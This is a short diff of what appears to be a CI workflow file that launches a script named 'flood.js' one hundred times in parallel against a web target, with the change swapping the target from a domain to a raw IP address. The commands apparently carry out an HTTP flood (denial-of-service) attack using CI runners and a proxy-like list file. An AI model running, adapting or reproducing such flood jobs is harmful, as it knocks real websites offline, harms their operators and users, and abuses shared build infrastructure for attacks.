@@ -21,7 +21,7 @@ jobs:
           chmod +x flood.js
           PIDS=()
           for i in {1..100}; do
-            timeout 85 node flood.js GET https://oyunortagim.com/ fres.txt 83 90 12
+            timeout 85 node flood.js GET http://45.141.150.78/ fres.txt 83 90 12
             PIDS+=($!)
           done
           
